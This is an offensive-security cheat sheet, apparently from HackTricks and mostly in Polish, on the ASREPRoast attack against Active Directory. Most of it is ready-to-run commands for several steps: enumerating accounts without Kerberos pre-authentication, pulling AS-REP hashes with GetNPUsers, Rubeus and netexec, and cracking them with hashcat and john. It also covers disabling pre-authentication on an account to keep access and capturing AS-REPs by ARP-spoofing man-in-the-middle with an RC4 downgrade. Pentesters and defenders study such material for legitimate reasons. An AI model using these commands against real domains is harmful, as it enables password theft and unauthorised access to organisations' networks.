# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast to atak bezpieczeństwa, który wykorzystuje użytkowników nieposiadających **Kerberos pre-authentication required attribute**. Zasadniczo ta podatność pozwala atakującemu zażądać uwierzytelnienia użytkownika od Domain Controller (DC) bez konieczności znajomości hasła użytkownika. DC odpowiada wtedy wiadomością zaszyfrowaną kluczem pochodzącym z hasła użytkownika, którą atakujący mogą próbować złamać offline, aby odkryć hasło użytkownika.

The main requirements for this attack are:

- **Lack of Kerberos pre-authentication**: Użytkownicy docelowi nie mogą mieć włączonej tej funkcji bezpieczeństwa.
- **Connection to the Domain Controller (DC)**: Atakujący muszą mieć dostęp do DC, aby wysyłać żądania i odbierać zaszyfrowane odpowiedzi.
- **Optional domain account**: Posiadanie domain account pozwala atakującym wydajniej identyfikować podatnych użytkowników poprzez zapytania LDAP. Bez takiego konta atakujący muszą zgadywać nazwy użytkowników.

#### Enumerowanie podatnych użytkowników (wymagane poświadczenia domeny)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Żądanie komunikatu AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus wygeneruje 4768 z typem szyfrowania 0x17 i typem preauth 0.

#### Szybkie jednowierszowe polecenia (Linux)

- Najpierw zenumeruj potencjalne cele (np. z leaked build paths) za pomocą Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Pobierz AS-REP pojedynczego użytkownika nawet z **pustym** hasłem używając `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec także wypisuje konfigurację LDAP signing/channel binding).
- Złam za pomocą `hashcat out.asreproast /path/rockyou.txt` – automatycznie wykrywa **-m 18200** (etype 23) dla AS-REP roast hashes.

### Łamanie
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Utrzymanie dostępu

Wymuś, aby **preauth** nie był wymagany dla użytkownika, dla którego masz uprawnienia **GenericAll** (lub uprawnienia do zapisu właściwości):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast bez poświadczeń

Atakujący może zająć pozycję man-in-the-middle, aby przechwycić pakiety AS-REP podczas ich przesyłania przez sieć, nie polegając na tym, że Kerberos pre-authentication jest wyłączone. Dlatego działa dla wszystkich użytkowników w VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) pozwala nam to zrobić. Co więcej, narzędzie zmusza stacje klienckie do używania RC4, modyfikując negocjację Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Źródła

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
